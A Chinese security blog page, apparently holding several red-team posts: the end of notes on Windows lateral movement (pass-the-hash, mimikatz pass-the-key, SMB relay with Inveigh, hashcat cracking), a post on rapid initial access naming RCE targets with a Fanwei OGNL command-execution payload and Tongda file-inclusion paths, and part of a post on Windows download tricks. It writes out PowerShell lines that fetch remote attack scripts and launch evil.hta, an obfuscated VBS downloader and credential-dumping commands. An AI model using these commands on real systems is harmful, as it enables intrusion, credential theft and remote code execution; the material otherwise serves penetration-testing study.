<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105348809.png" alt="image-20200826105348809"></p>
<p>​                对着target右键选择psexec</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105433978.png" alt="image-20200826105433978"></p>
<p>​            输入用户账户和hash，点击lauch后即可上线</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105236740.png" alt="image-20200826105236740"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105635042.png" alt="image-20200826105635042"></p>
<p>3、使用powershell进行PTH进行横向移动</p>
<p>​        首先使用cs生成hta文件，并且将这个hta挂载到web上</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105959580.png" alt="image-20200826105959580"></p>
<p>​        执行如下命令通过PTH加载evil.hta上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxxxxx&#x2F;Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxxx -Command \&quot;mshta http:&#x2F;&#x2F;xxx&#x2F;evil.hta\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826110606262.png" alt="image-20200826110606262"></p>
<p>​        也可以使用smbexec来进行hash传递上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxxxx&#x2F;invoke-SMBExec.ps1&#39;);Invoke-SMBExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxx -Command \&quot;mshta http:&#x2F;&#x2F;xxxx&#x2F;evil.hta\&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826112135162.png" alt="image-20200826112135162"></p>
<p>4、使用imapcket套件进行PTH</p>
<p>​        使用wmiexec进行pth</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; .&#x2F;Administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p>​        在cs下执行会有异常，具体原因不详。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113907462.png" alt="image-20200826113907462"></p>
<p>​        在cmd下执行正常，如果有问题需要改一下cmd的编码chcp 936</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113949941.png" alt="image-20200826113949941"></p>
<p>​        使用smbexec进行横向渗透,这种方式只能获取半交互的shell,不能在cs下或者webshell下进行利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes xx:xxx .&#x2F;Administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826114404627.png" alt="image-20200826114404627"></p>
<p>​        在windows server 2012R2以上默认无法使用RID非500的用户进行PTH利用。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826140439030.png" alt="image-20200826140439030"></p>
<p>​        当我们设置LocalAccountTokenFilterPolicy（默认不存在）这项为1时，则其他用户也可PTH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142001554.png" alt="image-20200826142001554"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142030450.png" alt="image-20200826142030450"></p>
<p><strong>pass the key</strong></p>
<p>​        当目标处于域环境并且安装了KB2871997补丁，可以使用这种方法进行横向移动。首先导出aes key </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826143252802.png" alt="image-20200826143252802"></p>
<p>​        使用mimikatz进行PTK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:xxx.ORG &#x2F;aes256:xxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144548650.png" alt="image-20200826144548650"></p>
<p>​        在dir的时候注意要使用主机名而不是ip。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144657435.png" alt="image-20200826144657435"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144600749.png" alt="image-20200826144600749"></p>
<h3 id="SMB-RELAY"><a href="#SMB-RELAY" class="headerlink" title="SMB RELAY"></a>SMB RELAY</h3><p><strong>什么是SMB?</strong></p>
<p>​        服务器消息块（SMB）协议是一种网络文件共享协议，在Microsoft Windows中实现称为Microsoft SMB协议。SMB允许您共享文件，磁盘，目录，打印机等。SMB运行在445端口并且提供了多种功能，例如操作文件，共享，消息传递，IPC等。</p>
<p><strong>什么是net-hash?</strong></p>
<p>​        net-hash是windows hash在网络中传递的一种形式形式，net-hash是由ntml hash计算得来的。</p>
<p><strong>什么是smb relay?</strong></p>
<p>​        要理解smb relay(中继)，关于windows认证过程的了解是绕不过去了，所以有必要先了解windows NTML是怎么认证的。</p>
<p>第一步：Client 将用户名和本机的一些信息发送给 Server</p>
<p>第二步：Server 产生一个16位的 Challenge 发送给 Client，同时本地存储 Challenge</p>
<p>第三步：Client 接收到 Server 的 Challenge 后使用输入的明文密码产生的 NTLM Hash加密 Challenge 产生 Response（也称为Net-NTLM Hash），并将 Response 发送给 Server</p>
<p>第四步：服务端接收到 Response ，使用 SAM 中所存储的对应用户的 NTLM Hash 来加密步骤2所存储的 Challenge ，并将结果与 Response 进行比较。若一致则通过认证。</p>
<p>​        通过上面的过程我们可以看到，在第三步客户端是使用服务端生成的Challenge和本地的NTLM Hash一起加密产生了net-hash，并将net-hash传递给服务端。如果在NTLM 认证的过程中，有一个第三者作为一个中介，client会以为它是server端并且将net-hash发送给这个第三者，那么这个第三者就可以拿到client的net-hash，替代client与server端进行认证，这个过程无论对于client还是server都是正常的完成ntml认证。但是对于第三者而言，它可以代替client去访问server端的资源。这个过程就叫做smb relay。</p>
<p><strong>怎么发起smb relay？</strong></p>
<p>​        一般情况下，我们要攻击的主机即使进行ntml认证，流量并不会经过第三者的主机。那么如何让目标主机和我们主机进行ntml认证呢。</p>
<p>1、LLMNR/NBNS欺骗</p>
<p>​            LLMNR和NBNS是Windows系统完成名称解析的一种方法。windows的名称解析规则如下：</p>
<ul>
<li>首先在本地host文件中进行查询(%windir%\System32\drivers\etc\hosts)</li>
<li>其次在DNS缓存/DNS服务器中进行查询</li>
<li>当上面两种方式未查询到后，则使用LLMNR或者NBNS协议进行解析。</li>
</ul>
<p>LLMNR工作过程：主机会通过 UDP 向局域网内发送多播查询，查询主机名对应的IP，查询范围被限制在本地子网内。本地子网内每台支持LLMNR的主机在收到这个查询请求后，收到该请求的主机会判断自己的主机名是不是这个查询的主机名。如果是，这台主机会回复自己IP地址给请求该查询的主机；如果不是<strong>，</strong>则丢弃该请求。</p>
<p>​        因为LLMNR并没有认证相应的主机是否是需要寻找的主机，因此攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。</p>
<p><strong>windows下使用Inveigh针对SMB RELAY利用</strong></p>
<p>​        首先windows不通版本使用的smb版本是不一样的，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Smb v1 主要用于 xp&#x2F;2003 以下的系统中</span><br><span class="line">Smb v2.x 主要用于 win vista&#x2F;7&#x2F;2008&#x2F;2008r2</span><br><span class="line">Smb v3.x 主要用于 win 8 &#x2F; 8.1 &#x2F; 2012 &#x2F; 2012r2 &#x2F;2016</span><br></pre></td></tr></table></figure>

<p>​        当目标开启了启 smb 签名后则无法利用，一般windows server会开启而windows单机不开启，打了ms08-068[KB957097]的主机也无法利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Users\dbadmin\Desktop\Inveigh.ps1</span><br><span class="line">Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y –LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826161637020.png" alt="image-20200826161637020"></p>
<p>​        当我们在windows单机上对不存在的主机发起smb请求，即可获取net-hash</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163902324.png" alt="image-20200826163902324"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163718354.png" alt="image-20200826163718354"></p>
<p>​        抓到net-hash后，可以尝试使用hashcat跑一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 -m 5600 hash.txt top10w.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826165658506.png" alt="image-20200826165658506"></p>
<p><strong>参考文章</strong></p>
<p><a href="https://www.freebuf.com/articles/network/246440.html" target="_blank" rel="noopener">内网横向移动：利用WMI来渗透</a></p>
<p><a href="https://lengjibo.github.io/LateralMovement/" target="_blank" rel="noopener">LateralMovement(横向移动)</a></p>
<p><a href="[https://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/](https://pingmaoer.github.io/2020/06/30/域内横向移动二/)">域内横向移动二</a></p>
<p><a href="[https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/](https://0x0c.cc/2019/09/25/内网横移之WinRM/)">内网横移之WinRM</a></p>
<p><a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/" target="_blank" rel="noopener">横向运动– WinRM</a></p>
<p><a href="http://t3ngyu.leanote.com/post/345687ddad59" target="_blank" rel="noopener">SCShell：横向移动工具</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-SMB" target="_blank" rel="noopener">横向渗透之 [SMB]</a></p>
<p><a href="[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/](https://3gstudent.github.io/3gstudent.github.io/域渗透-利用DCOM在远程系统执行程序/)">域渗透——利用DCOM在远程系统执行程序</a></p>
<p><a href="https://www.jianshu.com/p/c7d8e7d9c03c" target="_blank" rel="noopener">横向移动之smb中继攻击</a></p>
<p><a href="[https://www.7ten7.top/2019/12/12/2019-12-12-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B9%8BNTLM/](https://www.7ten7.top/2019/12/12/2019-12-12-Windows认证机制之NTLM/)">Windows认证机制之NTLM</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/107698144" target="_blank" rel="noopener">内网渗透研究：LLMNR和NetBIOS欺骗攻击分析</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于hw打点的思考</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-21 09:26:01" itemprop="dateCreated datePublished" datetime="2020-08-21T09:26:01+08:00">2020-08-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:03:38" itemprop="dateModified" datetime="2020-09-02T20:03:38+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​            一年一度的hw活动又开始了，关于hw的比拼，各个公司都十分看重，都希望能在这次比赛中拿到一个比较好的成绩，针对于hw这种形式，还是比较考验一个人或者一个团队的梭哈能力，有些红队人员虽然内网非常强，姿势也非常骚，可是打点可能不是很快，对于这种比赛来讲，就是手慢则无。反而一把梭哈，速度快还能拿到比较不错的成绩。下面我根据我的不成熟的经验来分析一下，如何提升速度。</p>
<p>​            首先是信息搜集的能力，我们可以想一下，如果一个攻击队，信息搜集非常慢，半天才找到不多的资产，然后再去做一些常规的rce的测试，和那些有自动化工具的队伍比起来就慢了一大截，因此hw还是比较考验队伍快速搜集资产的能力，否则即使0day在手，找不到对应的平台也没用啊。关于自动化信息搜集的工具，其实可以借助一些网络资产搜集引擎，因为hw的很多蓝方精神都是高度集中，你扫个端口肯定就被拌掉了，因此最好在搜集的时候能不直接和这些目标接触并且能拿到我们想要的信息。这里我提供一个思路，就是调用各种接口搜集资产信息，找到以后再去验证存活，再获取一些指纹信息，比如网站的架构，什么cms，用了什么中间件，这些信息对我们打点来说都是非常重要的。</p>
<p>​            然后再来谈谈挖洞，其实hw这些目标都挺大的，也就是说资产比较多，有新架构有老架构，用这种框架中间件的也非常多。那当我们拿到这么多资产后，我们该如何快速打点呢？</p>
<p>​            我认为首先应该去找各种影响比较大的rce去检测</p>
<p><strong>java站</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic rce  根据404报错的那个标题即可识别是否是weblogic</span><br><span class="line">struts rce		有人写了识别工具，也可以根据后缀比如.do，.action</span><br><span class="line">spring boot rce 根据404或者500的报错页面进行识别，找env文件</span><br><span class="line">shior rce       找java的登录口，看返回结果是否有remeberme 之类的字段</span><br></pre></td></tr></table></figure>

<p><strong>php站</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thinkphp rce thinkphp可以根据路由来进行识别</span><br><span class="line">解析漏洞   1.jgp&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p><strong>asp/aspx</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ueditor任意文件上传  扫ueditor的目录</span><br></pre></td></tr></table></figure>

<p>​        当没有这些影响比较大的漏洞时，我们再去考虑一些cms或者一些oa这种我们知道某些版本有漏洞的站，最好还是那种已知有rce的cms。这个其实也比较依赖于大家的经验和总结能力，毕竟要跟一些爆发的漏洞也挺费精力的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通达：</span><br><span class="line">漏洞指纹：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php 文件包含漏洞</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;mysql5&#x2F;my.ini&quot;&#125;</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&#125;&amp;url&#x3D;&#x2F;general&#x2F;..&#x2F;..&#x2F;nginx&#x2F;logs&#x2F;oa.access.log</span><br><span class="line">泛微：</span><br><span class="line">e-mobile常在89端口 rce</span><br><span class="line">访问login.do post如下内容：</span><br><span class="line">message&#x3D;(#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd&#x3D;whoami</span><br><span class="line">泛微rce &#x2F;weaver&#x2F;bsh.servlet.BshServlet 直接访问即可执行命令</span><br></pre></td></tr></table></figure>

<p>​        当这些可以直接可以利用的rce无法利用时，我们就要去找一些cms可以通过组合可以getshell的站。这些如果还没有，那我们就需要去看那些他们自己开发的网站了。去找找后台，找找上传，找找注入等等。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows文件下载方式总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-12 17:21:36" itemprop="dateCreated datePublished" datetime="2020-08-12T17:21:36+08:00">2020-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-03 13:46:59" itemprop="dateModified" datetime="2020-09-03T13:46:59+08:00">2020-09-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>

<p>​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方式不能通过http协议进行下载，但是可以通过smb协议进行下载文件，这也可以列为一种方式。</p>
<h3 id="下载任意格式文件"><a href="#下载任意格式文件" class="headerlink" title="下载任意格式文件"></a>下载任意格式文件</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p><strong>方法一：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt&#39;,&#39;C:\Windows\Temp\2.txt&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png" alt="image-20200812213732096"></p>
<p><strong>方法二：</strong></p>
<pre><code>首先准备一个ps脚本，内容如下</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;xxx:6666&#x2F;foo.xsl&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\Windows\Temp\&quot; </span><br><span class="line">ForEach ( $item in $Urls) &#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        使用下面命令执行下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -File down.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png" alt="image-20200812214929736"></p>
<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>​        用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt c:\windows\temp\test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png" alt="image-20200820104905690"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ccc:6666&#x2F;1.txt delete  删除缓存</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png" alt="image-20200820105120705"></p>
<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>​        bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;xxxx:6666&#x2F;1.txt C:\Windows\Temp\3.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png" alt="image-20200820105507751"></p>
<h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><p><strong>方法一：</strong></p>
<p>​        可以使用vbs脚本来执行文件下载操作,vbs内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>

<p>​        再使用cscript加载该文件执行下载写入的功能</p>
